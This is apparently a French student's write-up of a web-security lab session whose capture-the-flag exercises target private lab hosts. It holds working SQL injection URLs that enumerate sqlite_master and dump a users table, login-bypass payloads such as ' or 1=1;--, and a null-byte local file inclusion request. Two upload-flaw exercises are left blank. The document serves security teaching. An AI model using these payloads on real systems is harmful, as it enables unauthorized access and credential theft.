# Séance 5

## Exercice 1 - SQLi 1

Connectez vous à l'adresse http://10.33.3.14:8081/ et trouvez le flag.

```code
- http://10.33.3.14:8081/?article=2%27%20UNION%20SELECT%20tbl_name%20FROM%20sqlite_master;--
Warning: SQLite3::querySingle(): Unable to prepare statement: 1, SELECTs to the left and right of UNION do not have the same number of result columns in /var/www/html/index.php on line 29

- http://10.33.3.14:8081/?article=2%27%20UNION%20SELECT%20tbl_name,%20NULL%20FROM%20sqlite_master;--
Warning: SQLite3::querySingle(): Unable to prepare statement: 1, SELECTs to the left and right of UNION do not have the same number of result columns in /var/www/html/index.php on line 29

- http://10.33.3.14:8081/?article=2%27%20UNION%20SELECT%20tbl_name,%20NULL,%20NULL%20FROM%20sqlite_master;--
nqfrcqmrohejdybylkcpjcingpc umuddys fmrot pieggziibgyx cmmzjzq

10.33.3.14:8081/?article=0' UNION SELECT tbl_name, tbl_name, tbl_name FROM sqlite_master WHERE tlb_name <> 'articles';--
Warning: SQLite3::querySingle(): Unable to prepare statement: 1, no such column: tlb_name in /var/www/html/index.php on line 29

http://10.33.3.14:8081/?article=0%27%20UNION%20SELECT%20%20tbl_name,%20tbl_name,%20tbl_name%20FROM%20sqlite_master%20WHERE%20tbl_name%20!=%20%27articles%27;--
users

http://10.33.3.14:8081/?article=0%27%20UNION%20SELECT%NULL,%NULL,%20sql%20FROM%20sqlite_master%20WHERE%20tbl_name%20!=%20%27articles%27;--
CREATE TABLE 'users' ('login' varchar(50) NOT NULL, 'password' varchar(50) NOT NULL)

http://10.33.3.14:8081/?article=0%27%20UNION%20SELECT%20login,password,%20NULL%20FROM%20users;--
C0ngr4tz_QfetXpL-CF8bhFN99Azrk1VEBTcFU
```

## Exercice 2 - SQLi 2

Connectez vous à l'adresse http://10.33.3.14:8082/ et trouvez le flag.

```code
Login: admin
Password: ' or 1=1;--
Felicitation le mot de passe de l'admin est le flag

Login: admin' AND LENGTH(password) = 55;--
Felicitation le mot de passe de l'admin est le flag
(Le mot de passe est de 55 caractères)
```

## Exercice 3 - Faille upload 1

Connectez vous à l'adresse http://10.33.3.14:8083/ et trouvez le flag.

```code

```

## Exercice 4 - Faille upload 2

Connectez vous à l'adresse http://10.33.3.14:8084/ et trouvez le flag.

```code

```

## Exercice 5 - LFI

Connectez vous à l'adresse http://10.33.3.14:8085/ et trouvez le flag.

```code
http://10.33.3.14:8085/?page=.htaccess%00
```
